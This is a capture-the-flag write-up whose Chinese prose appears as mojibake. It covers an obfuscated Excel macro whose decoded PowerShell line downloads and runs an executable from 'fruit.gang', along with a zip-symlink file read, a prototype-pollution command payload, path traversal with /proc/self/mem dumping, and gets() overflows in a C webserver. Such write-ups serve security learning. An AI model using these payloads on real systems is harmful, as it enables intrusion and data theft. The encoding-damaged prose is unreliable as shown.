æ²¡åšå‡ºæ¥çš„`In the Dark`æ˜¯ä¸€ä¸ªè¿·å®«é¢˜ï¼Œåªæœ‰ä¸€ä¸ªå·¨å¤§çš„ä¸»å‡½æ•°å¹¶ä¸”æ§åˆ¶æµå¹³å¦åŒ–ï¼Œæˆ‘æš‚æ—¶æ²¡æœ‰è¶æ‰‹å·¥å…·å°±æ‹¿angrè·‘äº†è·‘ï¼Œæ²¡è·‘å‡ºæ¥ï¼ˆä»¥åå¾—æƒ³æƒ³åŠæ³•æ€ä¹ˆåšè¿™ç§å»å¹³å¦åŒ–çš„é¢˜ï¼‰ã€‚`Accelerated Hell`æ˜¯ä¸€ä¸ªæ¶‰åŠRust, CUDAçš„é€†å‘ã€‚

### Fruit Deals
Excel VBAå®ç—…æ¯’é€†å‘ã€‚è¯´å®è¯è¿™ä¸ªé¢˜æˆ‘æœ€æ‹…å¿ƒçš„ä¸æ˜¯é€†å‘çœ‹ä¸æ‡‚ï¼Œè€Œæ˜¯å¦‚ä½•åœ¨ä¸è§¦å‘å®çš„æƒ…å†µä¸‹çœ‹å®çš„å†…å®¹ã€‚

ç»™äº†ä¸€ä¸ªå¯ç–‘çš„xlsmï¼Œé¢˜å¹²ä¹Ÿè¯´è™½ç„¶æœ¬èº«ä¸æ˜¯æ¶æ„ç¨‹åºï¼Œä½†ä¹Ÿæœ€å¥½ä¸è¦ç›´æ¥æ‰“å¼€ã€‚æˆ‘å½“ä½œzipè§£å‹åï¼Œç¡®å®çœ‹åˆ°äº†`xl/vbaProject.bin`ä¸€ä¸ªVBAäºŒè¿›åˆ¶æ–‡ä»¶ï¼Œæœäº†ä¸€ä¸‹æ²¡æœ‰ç°æˆé€†å‘å·¥å…·ï¼Œæ„Ÿè§‰è¿˜æ˜¯ç”¨Excelæœ¬èº«æ¥æŸ¥çœ‹å®ä»£ç æ¯”è¾ƒå¥½ï¼Œåªè¦æ³¨æ„åˆ«ä¸å°å¿ƒè¿è¡Œäº†ï¼ˆæœ€å¥½æ˜¯æ”¾è™šæ‹Ÿæœºé‡Œå¼„ï¼Œä»¥å…ç¿»è½¦ï¼‰ã€‚
é»˜è®¤Excelæ˜¯ä¸ä¼šå¼€å¯å®çš„ï¼Œéœ€è¦æ‰‹åŠ¨å¼€å¯ã€‚è¦æŸ¥çœ‹å®ï¼Œéœ€è¦åœ¨ã€é€‰é¡¹-è‡ªå®šä¹‰åŠŸèƒ½åŒº-å¼€å‘å·¥å…·ã€‘æ‰“å¼€å¼€å‘å·¥å…·é€‰é¡¹å¡ï¼Œå¹¶åœ¨é‚£é‡Œæ‰¾åˆ°VBAçš„ç¼–è¾‘å™¨ã€‚è¿›å»åæ˜¯èƒ½çœ‹åˆ°ä¸¤æ®µVBA scriptï¼Œå…¶ä¸­ä¸€æ®µæœ‰å¾ˆæ˜æ˜¾çš„æ··æ·†ç‰¹å¾ï¼Œå¤§æ„åŸºæœ¬æ˜¯å½“æŸä¸ªå•å…ƒæ ¼ç­‰äºæŸä¸ªbase64ä¹±ç æ—¶ï¼Œç»™å­—ç¬¦ä¸²åŠ ä¸€ä¸ªå­ä¸²ï¼Œæœ€åè°ƒç”¨Shellæ‰§è¡Œè¿™ä¸ªä¸²ã€‚çœ‹èµ·æ¥æ²¡æœ‰å…¶ä»–å±é™©è¡Œä¸ºã€‚

äºæ˜¯ï¼Œæœ€ç»ˆæˆ‘åœ¨æŠŠShellæ³¨é‡Šæ‰åï¼ŒåŠ äº†æ–­ç‚¹è¿è¡Œï¼ˆä¸å¾—ä¸è¯´VBAçš„è°ƒè¯•å™¨æ˜¯çœŸéš¾ç”¨ï¼‰ã€‚è¿è¡Œåˆ°è¿™è¡Œæ—¶ï¼Œå¯ä»¥çœ‹å‡ºä»–æœ¬æ¥æ‰§è¡Œçš„æ˜¯è¿™æ ·çš„ä»£ç ï¼š
```powershell
"poWeRsHELL -command "$oaK = new-object Net.WebClient;$OrA = 'http://fruit.gang/malware';$CNTA = 'banANA-Hakrz09182afd4';$jri=$env:public+'\'+$CNTA+'.exe';try{$oaK.DownloadFile($OrA, $jri);Invoke-Item $jri;break;} catch {}""
```
é¢˜å¹²ä¸­è¯´ï¼Œflagæ˜¯è¦ä¸‹è½½çš„æ–‡ä»¶åï¼Œè¿™é‡Œå¾ˆæ˜æ˜¾å°±æ˜¯`$CNTA.exe`äº†ï¼ˆ$env:publicæˆ‘æœ¬åœ°è°ƒè¯•æ˜¯ç©ºçš„ï¼‰

### PES-128
ä¸çŸ¥é“æ˜¯ä¸æ˜¯éé¢„æœŸã€‚è¿™ä¸ªé¢˜ç»™äº†ä¸€ä¸ªäºŒè¿›åˆ¶çš„åŠ å¯†ç¨‹åºï¼Œå’Œä¸€ä¸ªè¢«åŠ å¯†çš„flagå¯†æ–‡hexã€‚æµ‹è¯•åå‘ç°ï¼š
- ç¬¬ä¸€ä¸ªå­—ç¬¦æ˜¯ä¸ä¼šåŠ å¯†çš„ï¼Œå°±æ˜¯æ˜æ–‡ï¼ˆflagç¬¬ä¸€ä¸ªhexå°±æ˜¯uï¼‰
- åªæ”¹æœ€åä¸€ä¸ªå­—ç¬¦ï¼Œä¸ä¼šå½±å“å‰é¢çš„åŠ å¯†ç»“æœï¼Œæ¯”è¾ƒåƒæµåŠ å¯†

é‚£å°±ç»“æŸäº†ï¼Œè¿™ä¸ªåŠ å¯†å¼±é€ä½çˆ†ç ´ï¼Œåªè¦ä»å‰é¢å¼€å§‹éå†æœ€åä¸€ä½ï¼Œåªè¦ç»™å‡ºå’ŒåŠ å¯†flagç›¸åŒçš„ç»“æœå°±è¯´æ˜æˆ‘ä»¬çŒœå¯¹äº†ï¼Œå¯ä»¥çŒœä¸‹ä¸€é—®äº†ã€‚
flagæ˜¯`utflag{i_got_the_need_for_amdahls_law}`ï¼Œæˆ‘çŒœä½œè€…é¢„æœŸä¸€ä¸ªç±»ä¼¼ä¾§ä¿¡é“/æ—¶é—´æ”»å‡»çš„è§£æ³•ã€‚è¿™ç®—æ˜¯ä¾§ä¿¡é“å—ï¼Ÿæˆ‘ä¸å¥½è¯´ï¼Œå¦‚æœæ”¹æˆåªåˆ¤æ–­æ˜¯å¦ç­‰äºflagè€Œä¸æ˜¯ç›´æ¥ç»™å‡ºflagå®Œæ•´å¯†æ–‡è®©æˆ‘ä»¬è‡ªå·±æµ‹è¯•ï¼Œé‚£åº”è¯¥æ˜¯æ¯”è¾ƒæ ‡å‡†çš„ä¾§ä¿¡é“ã€‚

## Web
Webé¢˜é™¤äº†ç¬¬äºŒå¤©æ”¾å‡ºçš„rust+wasmæ²™ç®±é¢˜ï¼Œéƒ½åšäº†ã€‚æœ‰ç‚¹éš¾åº¦ä½†æ˜¯åœ¨æˆ‘èƒ½å¤„ç†çš„èŒƒå›´å†…ã€‚
### SchrÃ¶dinger
è¿™ä¸ªé¢˜è€ƒçš„zipé‡Œè—è½¯é“¾æ¥æ³„éœ²æ–‡ä»¶ï¼Œä¹Ÿæ˜¯æˆ‘æ¥è§¦CTFä»¥æ¥ï¼Œç¬¬ä¸€ä¸ªå­¦ä¼šçš„WebçŸ¥è¯†ç‚¹ï¼ˆGeekGame1ï¼‰

`zip`ä¸­åŒ…å«`--symlinks`æ—¶ï¼Œå¯ä»¥æŠŠè½¯é“¾æ¥æœ¬èº«æ‰“åŒ…è¿›zipåŒ…é‡Œã€‚åœ¨æœåŠ¡å™¨è§£å‹ä¹‹åï¼Œè¿™ä¸ªè½¯é“¾æ¥è¿˜ä¿æŒåŸæ¥çš„æŒ‡å‘ï¼Œå°±ä¼šæŒ‡å‘æœåŠ¡å™¨ä¸Šæ–‡ä»¶çš„å†…å®¹ã€‚å¦‚æœæœåŠ¡ç«¯æœ‰è§£å‹åæŠŠå†…å®¹å›æ˜¾çš„æ“ä½œï¼Œå°±ä¼šå¯¼è‡´æ³„éœ²ä»»æ„æ–‡ä»¶ã€‚

è¯•ä¸€ä¸‹`/etc/passwd`å¯ä»¥æ³„éœ²ï¼Œè¯´æ˜æ˜¯å¯ä»¥æ‰“é€šçš„ã€‚ç„¶åæˆ‘åˆ†åˆ«æ‹¿åˆ°äº†`/proc/self/cmdline`å’Œ`/proc/self/environ`ï¼Œå¯ä»¥çŸ¥é“åœ¨è¿è¡Œçš„æœåŠ¡ç«¯è¿›ç¨‹æ˜¯`python3 src/main.py`ï¼ˆä¸è¿‡å¥‡æ€ªçš„æ˜¯æˆ‘ä¸ç®¡æ€ä¹ˆæ ·éƒ½è®¿é—®ä¸åˆ°è¿™ä¸ªæ–‡ä»¶ï¼Œå¯èƒ½æ˜¯`os.remove`äº†æˆ–è€…æƒé™æ˜¯`--x`ï¼‰ï¼Œç¯å¢ƒå˜é‡é‡Œå¯ä»¥çœ‹åˆ°`HOME=/home/copenhagen`ï¼Œç„¶åå°è¯•è¯»å–`/home/copenhagen/flag.txt`ï¼ŒæˆåŠŸè¯»åˆ°äº†ã€‚ä¸è¿‡æ²¡æ‹¿åˆ°æºç ä¸å¤ªç”˜å¿ƒã€‚

### Easy Mergers v0.1
å…³é”®è¯ï¼ŒMergerï¼ŒnodejsæœåŠ¡ç«¯ï¼Œä¸€çœ¼åŸå‹é“¾æ±¡æŸ“ã€‚

åŸå‹é“¾æ˜¯javascriptçš„é¢å‘å¯¹è±¡ç»§æ‰¿æœºåˆ¶çš„ä¸€éƒ¨åˆ†ã€‚ç®€å•æ¥è¯´ï¼ŒJSé‡Œçš„å¯¹è±¡ï¼Œåœ¨æ‰¾ä¸åˆ°ä¸€ä¸ªå±æ€§æ—¶ï¼Œä¼šæŸ¥æ‰¾å®ƒçš„åŸå‹ï¼Œä¹Ÿå°±æ˜¯`__proto__`æŒ‡å‘çš„å¯¹è±¡æ˜¯å¦æœ‰è¿™ä¸ªå±æ€§ï¼Œç›´åˆ°`__proto__`ä¸ºç©ºã€‚è¿™å¯¹åº”äº†ä¸€èˆ¬é¢å‘å¯¹è±¡è¯­è¨€çš„ç»§æ‰¿æœºåˆ¶ï¼Œ`__proto__`å°±æ˜¯çˆ¶ç±»å±æ€§ã€‚æ‰€æœ‰çš„å¯¹è±¡æœ€ç»ˆæ€»èƒ½å›åˆ°åˆ°Objectçš„åŸå‹ä¸­ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œæ§åˆ¶äº†`Object.__proto__`ï¼Œå°±æ§åˆ¶äº†æ‰€æœ‰å¯¹è±¡ã€‚å¦‚æœé€šè¿‡`Object.__proto__.A=B`è¿™æ ·çš„èµ‹å€¼ï¼Œå°±èƒ½ç»™æ‰€æœ‰çš„å¯¹è±¡èµ‹äºˆ`A`è¿™ä¸ªå±æ€§ã€‚è¿™ç§èµ‹å€¼çš„é«˜å±æ“ä½œä¸€èˆ¬å‡ºç°åœ¨åˆå¹¶ä¸¤ä¸ªå¯¹è±¡æ—¶ï¼Œ`A[key1][key2] = B[key1][value]`ï¼Œå¦‚æœèƒ½æ§åˆ¶`key1=="__proto__"`å’Œ`key2, value`ï¼Œé‚£æœ‰å¯èƒ½æ§åˆ¶åŸå‹é“¾ã€‚

è¿™ä¸ªé¢˜çš„ç›®æ ‡å¾ˆæ˜ç¡®ï¼Œåœ¨`merger.js`é‡Œï¼Œæœ‰ä¸€ä¸ª`var secret = {}`ï¼Œå¦‚æœ`secret`åŒ…å«ä¸€ä¸ª`cmd`å±æ€§ï¼Œå°±ä¼šé€šè¿‡`child_process`æ¨¡å—æ‰§è¡Œshellå‘½ä»¤ã€‚ä¸»é¡µé‡ŒåŒ…æ‹¬ä¸¤ä¸ªåŠŸèƒ½ï¼Œä¸€ä¸ªæ˜¯ä¸ºä¸€ä¸ªå¯¹è±¡åˆ—è¡¨å¢åŠ ä¸€ä¸ªåŒ…å«ä»»æ„å­—æ®µçš„å¯¹è±¡ï¼Œå¦ä¸€ä¸ªæ˜¯å¯ä»¥æä¾›ä¸€ä¸ªæ–°çš„å¯¹è±¡ï¼Œåˆå¹¶åˆ°ä¸€ä¸ªå·²ç»æ·»åŠ çš„å¯¹è±¡é‡Œï¼Œå…¶ä¸­åŒ…æ‹¬è¿™æ ·çš„ä¸€ä¸ªé«˜å±æ“ä½œï¼š
```javascript
if (!(orig[data.attributes[k]] === undefined) &&
     isObject(orig[data.attributes[k]]) &&
      isObject(data.values[k])) {
    for (const key in data.values[k]) {
        orig[data.attributes[k]][key] = data.values[k][key];
    }
}
```
å› æ­¤æˆ‘ä»¬çš„ç­–ç•¥æ˜¯ï¼šé¦–å…ˆä¸Šä¼ ä¸€ä¸ªå¯¹è±¡ï¼š`{"__proto__": {"cmd": "cat flag.txt"}}`ï¼Œç„¶åè®©å®ƒå’Œå®ƒè‡ªå·±åˆå¹¶ã€‚è¿™æ ·å°±ä¼šè§¦å‘`orig["__proto__"]["cmd"] = "cat flag.txt"`ã€‚

å¦å¤–æ³¨æ„ï¼Œç½‘é¡µç«¯è¡¨å•ä¸Šä¼ æ—¶ï¼Œ`value`ä¸èƒ½æ˜¯å¯¹è±¡ã€‚ä½†å› ä¸ºæœåŠ¡ç«¯æ¥æ”¶çš„æ˜¯jsonå¯¹è±¡ï¼Œæ‰€ä»¥é€šè¿‡requestsç­‰ç›´æ¥ä¼ jsonå¯¹è±¡å¯ä»¥ç»•è¿‡é™åˆ¶ã€‚

flag: `utflag{p0lluted_b4ckdoorz_and_m0r3}`

### Home on the Range
è¿™ä¸ªé¢˜ç»™äº†ä¸€ä¸ªæ–‡ä»¶æœåŠ¡å™¨ï¼Œèƒ½çœ‹ç›®å½•å’Œæ–‡ä»¶ï¼Œèƒ½çœ‹åˆ°åˆ†å‘çš„æ˜¯`www`ç›®å½•ä¸‹çš„æ–‡ä»¶ï¼ˆçŒœæµ‹æ˜¯`/var/www`ï¼‰ã€‚ç»“åˆæ ‡é¢˜å’Œæè¿°ï¼ŒçŒœæµ‹`Range`è¿™ä¸ªheaderåº”è¯¥æ˜¯æœ‰æ•ˆçš„ï¼Œè¿™ä¸ªå¯ä»¥è®©æœåŠ¡å™¨æä¾›æ–‡ä»¶çš„éƒ¨åˆ†ã€‚

æ¥ä¸‹æ¥å› ä¸ºè¿™ä¸ªæ˜¯æ–‡ä»¶æœåŠ¡å™¨ï¼Œé¦–å…ˆæƒ³åˆ°çš„æ˜¯èƒ½ä¸èƒ½åšè·¯å¾„ç©¿è¶Šã€‚requestså’Œurllib3ä¼šé»˜è®¤æŠŠ`..`ç»™neutralizeæ‰ï¼Œç”¨burpæ˜¯å¯ä»¥çš„ï¼Œè®¿é—®`/../..`æœç„¶çœ‹åˆ°äº†æ ¹ç›®å½•ã€‚ä¸ºäº†åç»­çš„è¿‡ç¨‹ï¼Œæˆ‘ä»¬ç»™requestsä¸Šä¸€ä¸ªè¡¥ä¸ï¼Œæ‹¦æˆªè¯·æ±‚æŠŠ`../../`å¡åˆ°æŠ¥æ–‡é‡Œ

```python
# https://stackoverflow.com/questions/23496750/how-to-prevent-python-requests-from-percent-encoding-my-urls
class NoQuotedCommasSession(requests.Session):
    def send(self, *a, **kw):
        # a[0] is prepared request
        a[0].url = a[0].url.replace('$', "../../")
        return requests.Session.send(self, *a, **kw)
```

å¾ˆå®¹æ˜“åœ¨æ ¹ç›®å½•æ‰¾åˆ°æºç `server.py`ï¼Œä¸‹è½½ä¸‹æ¥ï¼Œå‘ç°ä¸¤ä¸ªä¿¡æ¯
- ç¨‹åºå¼€å¤´æŠŠflagè¯»åˆ°å˜é‡é‡Œï¼ŒæŠŠ`flag.txt`åˆ æ‰äº†ï¼Œåªåœ¨ç¨‹åºé€€å‡ºæ—¶ä¼šå†™å›æ–‡ä»¶ã€‚è¿™ä¸ªå˜é‡åœ¨ç¨‹åºä¸­å…¨ç¨‹æ²¡æœ‰è®¿é—®ã€‚åˆ é™¤æ–‡ä»¶æ—¶æ–‡ä»¶ä¹ŸåŒæ—¶è¢«å…³é—­äº†ï¼Œæ‰€ä»¥ä¸èƒ½åœ¨`proc`æ–‡ä»¶ç³»ç»Ÿæ‰¾åˆ°ã€‚
- `Range`æ˜¯å®ç°æ–¹å¼æ˜¯`seek`

æ‰€ä»¥ç­–ç•¥å°±å¾ˆæ¸…æ¥šäº†ã€‚æˆ‘ä»¬çŸ¥é“`/proc/self/mem`ä¿å­˜ç€è¿›ç¨‹çš„å†…å­˜è§†å›¾ï¼Œå¹¶ä¸”é€šè¿‡`seek`æˆ–è€…å‘½ä»¤è¡Œç¨‹åº`dd`ï¼Œç»“åˆç¨‹åºå†…åç§»æ˜¯å¯ä»¥ç›´æ¥dumpå‡ºå†…å­˜çš„ã€‚å½“ç„¶ï¼Œå› ä¸ºå†…å­˜æ®µä¸æ˜¯å¤„å¤„éƒ½å¯è¯»ï¼Œæ‰€ä»¥ç›´æ¥catæ˜¯ä¼šæŠ¥permission deniedçš„ã€‚å¯¹åº”çš„å†…å­˜åç§»å¯ä»¥çœ‹`/proc/self/maps`

ä¸è¿‡ä¼¼ä¹å› ä¸ºæ‰€æœ‰ç©å®¶å…±äº«åŒä¸€ä¸ªæœåŠ¡ç«¯å®ä¾‹ï¼Œè¿™ä¸ªpythonè¿›ç¨‹çš„å †ç‰¹åˆ«é«˜ï¼Œè€Œä¸”å †çš„å¤§å°è¿˜åœ¨éšç€æ—¶é—´ä¸æ–­ä¸Šæ¶¨ï¼ˆå†…å­˜æº¢å‡ºè­¦å‘Šï¼‰ï¼Œå¦‚æœä¸èƒ½å¿«é€Ÿå®šä½ç›®æ ‡å †å—æ˜¯å¾ˆéº»çƒ¦çš„ã€‚å½“ç„¶ï¼Œè¿™é‡Œé¢ç›¸å½“å¤šçš„å †éƒ½æ˜¯å±äºç¬¬ä¸‰æ–¹åº“çš„ã€‚Pythonçš„å±€éƒ¨å˜é‡åº”è¯¥å¤„äº`libpython3.x.so`ä¸Šæ–¹çš„ä¸€ä¸ªæ— åå †å—ï¼ˆæƒé™åº”è¯¥æ˜¯`rw-`ï¼‰ã€‚ä¸è¿‡è¿™ä¸ªå—æœ¬èº«ä¹Ÿæœ‰`7b2e0f2da000-7b2e0f6cd000`è¿™ä¹ˆå¤§çš„èŒƒå›´ï¼Œä¸€æ¬¡å…¨éƒ¨dumpæ€•æŠŠæœåŠ¡å™¨æå´©ï¼ˆå¦‚æœè®©æœåŠ¡å™¨500äº†å°±ä»€ä¹ˆæ•°æ®éƒ½æ‹¿ä¸åˆ°äº†ï¼‰ï¼Œæ‰€ä»¥æœ€å¥½ä»¥é¡µï¼ˆ0x1000ï¼‰ä¸ºå•ä½ä¸€ç‚¹ä¸€ç‚¹dumpã€‚

> é¡ºä¾¿è¿™ä¸ªé¢˜æˆ‘ä¸€å¼€å§‹çŠ¯äº†ä¸€ä¸ªå·¨å¤§çš„é”™ï¼Œæˆ‘ä»¥ä¸ºæ˜¯`utctf{`å¼€å¤´ï¼Œä½†å…¶å®è¿™ä¸ªæ¯”èµ›çš„flagå…¨æ˜¯`utflag{`å¼€å¤´çš„ï¼Œæ‰€ä»¥æˆ‘æ€ä¹ˆä¹Ÿæœä¸åˆ°

flag: `utflag{do_u_want_a_piece_of_me}`

## Misc
ä¸åƒå¾ˆå¤šæ¯”èµ›æŠŠå–è¯ã€éšå†™ã€å¼€æºä¿¡æ¯é¢˜ç”šè‡³æ²™ç›’ã€ç®€å•çš„cryptoéƒ½æ”¾miscé‡Œï¼Œè¿™ä¸ªé¢˜çš„miscæ˜¯çœŸæ­£æ„ä¹‰ä¸Šçš„miscï¼ŒçœŸçš„ä¸çŸ¥é“æ”¾å“ªä¸ªåˆ†ç±»åˆé€‚ã€‚
### CCV
è¿™ä¸ªé¢˜çš„èƒŒæ™¯æ˜¯ä¿¡ç”¨å¡æ ¡éªŒç ï¼ˆPAN CVVï¼‰ç®—æ³•ã€‚

é€šè¿‡è¿™ä¸ªé¢˜æˆ‘ä¹Ÿæ˜¯æ‰çŸ¥é“äº†ï¼Œä¿¡ç”¨å¡æ ¡éªŒæ˜¯åŸºäºDESçš„æ ‡å‡†ç®—æ³•ï¼Œéœ€è¦ä¸¤ä¸ªå¯†é’¥ï¼ˆåŠ èµ·æ¥16å­—èŠ‚ï¼‰ï¼Œæ ¡éªŒç ç”Ÿæˆç®—æ³•æˆ‘æ˜¯çœ‹çš„[è¿™ç¯‡åšå®¢](https://medium.com/@ruimin.yangnl/payment-101-series-card-verification-code-cvc-card-verification-value-cvv-explained-5f7205ae2b67)çš„ä»‹ç»ã€‚ï¼ˆè€ƒè™‘åˆ°è¿™ç¯‡åšå®¢è¦ç™»å½•æ‰èƒ½çœ‹ï¼Œæˆ‘è¿™é‡Œç®€è¿°ä¸€ä¸‹ï¼‰

æ ¡éªŒç ä¼šæ ¹æ®PANå·ç ï¼Œexpire dateå’Œservice codeï¼ˆ3ä½ï¼Œå‚è€ƒ[ç»´åŸºç™¾ç§‘](https://en.wikipedia.org/wiki/Digital_card)ï¼‰æŒ‰å¦‚ä¸‹ç®—æ³•å¾—åˆ°ä¸‰ä½CVV:
- æŠŠPAN,date,service codeè¿èµ·æ¥ï¼Œè¡¥0åˆ°32ä½æ•°å­—ï¼Œçœ‹æˆä¸¤ä¸ª16ä½hexï¼ˆå³ä¸¤ä¸ª8byteså—ï¼Œè®°ä¸ºA, Bï¼‰ï¼Œè€Œä¸¤ä¸ªå¯†é’¥è®°ä¸º`X`, `Y`
- è®¡ç®—ï¼šC = E(X, D(Y, E(A, xor(E(X, A), B))))
  - å…¶ä¸­E(X,A)è¡¨ç¤ºä»¥Xä½å¯†é’¥åŠ å¯†Aï¼ŒD(X,A)è¡¨ç¤ºç”¨Xä¸ºå¯†é’¥è§£å¯†Aï¼Œxor(A,B)è¡¨ç¤ºABé€ä½å¼‚æˆ–ã€‚è¿™é‡ŒåŠ å¯†è§£å¯†å‡æ˜¯DES-64ç®—æ³•
- æŠŠCçš„hexä¸­æ‰€æœ‰æ•°å­—0-9æå–å‡ºæ¥ï¼Œå†æŠŠæ‰€æœ‰å­—æ¯a-fæå–å‡ºæ¥æ”¾åœ¨æ•°å­—åé¢ï¼Œå†æŠŠå­—æ¯æŒ‰åå…­è¿›åˆ¶å‡å»10ï¼ˆå˜ä¸º0-5çš„æ•°å­—ï¼‰
- æœ€ç»ˆçš„ä¸€ä¸²æ•°å­—å‰ä¸‰ä½ä¸ºæ ¡éªŒç ã€‚

æ ¹æ®é¢˜ç›®æè¿°çš„å¯†é’¥ï¼Œè¿™ä¸ª[ç®—æ³•](ccv/test_DES.py)èƒ½å¤Ÿæ ¡éªŒæœåŠ¡ç«¯å‘æ¥çš„æ‰€æœ‰PAN cardï¼Œä¸€å…±è¦æ ¡éªŒ336ä¸ªè¿™æ ·çš„ç ã€‚ä¼¼ä¹é™¤äº†å‰8è½®å¤–ï¼Œåé¢ç»“æœéƒ½æ˜¯å›ºå®šçš„ï¼Œç­”æ¡ˆçš„01ä¸²å¯ä»¥è¢«è§£ç ä¸ºASCIIç ã€‚

flag: `utflag{hope_none_of_those_were_yours_lol}`

## Binary Exploitation
è¿™å±Špwné¢˜åªæœ‰ä¸¤ä¸ªï¼Œä½†éƒ½æ˜¯1000åˆ†é‡é‡çº§å¤§é¢˜ï¼ˆç¬¬äºŒé¢˜æ›´æ˜¯ç›´æ¥å¯ç”¨äºç”Ÿäº§ç¯å¢ƒï¼Œåªæ˜¯å› ä¸ºåç¡¬ä»¶æˆ‘æ²¡ç¢°ï¼‰

### Handwritten Webserver (æœªåšå‡º)

> è¿™ä¸ªé¢˜æˆ‘åœ¨èµ›åä¸¤å¤©åšå‡ºæ¥äº†ï¼Œä¸æ˜¯å †é¢˜ï¼Œåº”è¯¥è¯´ç¡®å®æœ‰ç‚¹éš¾åº¦ï¼Œè€Œä¸”æ¯”è¾ƒæ–°é²œã€‚

è¿™ä¸ªé¢˜æ˜¯ä¸€ä¸ªCè¯­è¨€æ‰‹æ“çš„HTTPæ–‡ä»¶æœåŠ¡å™¨ã€‚æœåŠ¡å™¨ä¸Šå¯ä»¥ä¸‹è½½åˆ°æºç ã€äºŒè¿›åˆ¶ç¨‹åºã€Makefileï¼Œä½†æ˜¯å¦‚æœæƒ³è¯»`flag.txt`æ–‡ä»¶æ—¶ï¼Œä¼šæç¤º403 Forbiddenï¼Œä¼šè¿”å›headerså†…å®¹ã€‚

æºç ä¸­æ¼æ´ç‚¹éå¸¸æ˜æ˜¾ï¼Œè¿™ä¸ªé¢˜å±…ç„¶ç”¨äº†ä¸¤æ¬¡`gets`æ¥è¯»å–ç”¨æˆ·è¾“å…¥åˆ°æ ˆä¸Šã€‚ä½†æ˜¯ï¼Œè™½ç„¶å¤§é‡ä½¿ç”¨å †å­˜å‚¨ä¸­é—´å­—ç¬¦ä¸²ï¼Œå´å‡ ä¹çœ‹ä¸åˆ°å †æº¢å‡ºï¼ˆæ‰€æœ‰mallocéƒ½æ˜¯ç”³è¯·strlen+1çš„ï¼Œå¾ˆè§„èŒƒï¼‰ï¼Œå¦å¤–é¢˜ç›®ä¸­reallocå¤§é‡ä½¿ç”¨ï¼Œä½†æ²¡æœ‰å¤šå°‘freeï¼Œå †åˆ©ç”¨ä¼šæ¯”è¾ƒå›°éš¾ã€‚æœ€å…³é”®çš„æ˜¯ï¼Œè¿™ä¸ªç¨‹åºæ²¡æœ‰ç”¨retè¿”å›è€Œæ˜¯ç›´æ¥exitï¼Œå› æ­¤è™½ç„¶æœ‰å¦‚æ­¤é€†å¤©çš„æ ˆæº¢å‡ºæˆ‘ä»¬å´æ— æ³•ç›´æ¥æ‰“ROPã€‚

é€šè¿‡`.comments`æ®µï¼Œå¯ä»¥å¾—çŸ¥ç¨‹åºç”±Ubuntu 20.04 GCC 9.4.0ç¼–è¯‘ï¼Œå› æ­¤çŒœæµ‹æœåŠ¡ç«¯libcæ˜¯2.31ç‰ˆæœ¬ï¼ˆå¾…éªŒè¯ï¼‰ï¼Œæ‰€ä»¥æœ¬åœ°å…ˆç”¨patchelfé…ç½®å¥½ç¯å¢ƒã€‚

#### ç¨‹åºé€»è¾‘
é¦–å…ˆchecksecï¼Œpartial RELRO, æ— canaryï¼Œæ— PIEï¼Œæœ‰NXã€‚

- é¦–å…ˆä¼šgetsè¯»å–é¦–è¡Œåˆ°æ ˆçš„ç¼“å†²åŒºï¼Œç”¨take_until_charè¯»å–åˆ°ç¬¬ä¸€ä¸ªã€ç¬¬äºŒä¸ªç©ºæ ¼ï¼Œå†ç”¨take_until_newlineè¯»å–å‰©ä½™å†…å®¹ï¼Œåˆ†åˆ«ä½œä¸ºmethod, path, version
  - versionå¿…é¡»æ˜¯`HTTP/1.1`æˆ–è€…`HTTP/1.0`å¦åˆ™longjmp
- ç„¶åä¼šè¿›å…¥ä¸€ä¸ªå¾ªç¯è¯»å–headersï¼Œæ¯è¡Œéƒ½æ˜¯getsï¼Œtake_until_charè¯»å–åˆ°å†’å·ï¼Œç„¶åtake_until_newlineè¯»å–å‰©ä½™å†…å®¹ã€‚ç›´åˆ°take_until_charå‘ç°ä¸€ä¸ªç©ºè¡Œã€‚
  - ä¹‹åä¼šæŠŠheaderä¿¡æ¯ï¼ˆåŒ…å«ä¸¤ä¸ªå­—ç¬¦ä¸²æŒ‡é’ˆçš„ç»“æ„ä½“ï¼‰æ”¾è¿›headersæ•°ç»„é‡Œï¼š

```c
struct Header {
    char *name;
    char *value;
};

for (;;) {
    char *header_line = gets(buf);
    if (header_line == NULL) longjmp(err, 1);
    if (strlen(header_line) == 0 || strcmp(header_line, "\r") == 0) break; // "\n" or "\r\n"; end of query

    int index = 0;
    char *name = take_until_char(header_line, &index, ':');
    char *value = take_until_newline(header_line, &index);
    name = malloc_str(name);
    value = malloc_str(value);

    if (header_count + 1 > header_cap) {
        int new_cap = header_cap < 4 ? 4 : header_cap * 2;
        headers = realloc(headers, sizeof(struct Header) * new_cap);
        header_cap = new_cap;
    }
    struct Header h;
    h.name = name;
    h.value = value;
    headers[header_count] = h;
    header_count += 1;

    if (strcasecmp(h.name, "content-length") == 0) {
        char* end = NULL;
        int value = strtol(h.value, &end, 10);
        if (end != h.value) {
            content_length = value;
        }
    }
}

```

- å½“pathæœ¬èº«åŒ…å«(strstr)`flag.txt`å­—ç¬¦ä¸²æ—¶ï¼Œä¼šè¿›å…¥`debug_handler`åˆ†æ”¯ï¼Œä¸ä¼šè¯»å–æ–‡ä»¶è€Œä¼šè¿”å›headers
- å…¶ä»–æƒ…å†µï¼Œä¼šè¿›å…¥`fileserv_handler`åˆ†æ”¯ï¼Œé¦–å…ˆå¯¹`path`è°ƒç”¨`resolve_path`å‡½æ•°ã€‚`resolve_path`æœ¬èº«å‡è®¾pathå¿…é¡»ä»¥`/`å¼€å¤´ï¼Œç„¶åæŠŠå®ƒè½¬æ¢ä¸ºä¸€ä¸ªå®Œæ•´çš„è·¯å¾„ï¼ˆ`./`å¼€å¤´ï¼Œneutralizeæ‰`..`å’Œ`.`ï¼‰ï¼Œä¹‹åæ‰“å¼€æ–‡ä»¶ï¼Œçœ‹æ–‡ä»¶æ˜¯ç›®å½•è¿˜æ˜¯ä¸€èˆ¬æ–‡ä»¶è¿›è¡Œåç»­å·¥ä½œã€‚

```c
handler_fn handler;
    
if (strstr(path, "flag.txt") != NULL) {
    handler = debug_handler;
} else {
    handler = fileserv_handler;
}
handler(method, path, version, header_count, headers, data, err);
```

- ç¨‹åºç”¨äº†longjmpæ¥å¼‚å¸¸å¤„ç†ï¼Œä¸Šä¸‹æ–‡ä¿å­˜åœ¨æ ˆä¸Šã€‚
  - åœ¨è¯»å–headersæ—¶æ²¡æœ‰åœ¨ç»“å°¾å¤šåŠ ä¸€ä¸ªæ¢è¡Œä¼šç¨³å®šè§¦å‘longjmpã€‚

```c
char *header_line = gets(buf);
if (header_line == NULL) longjmp(err, 1);
```

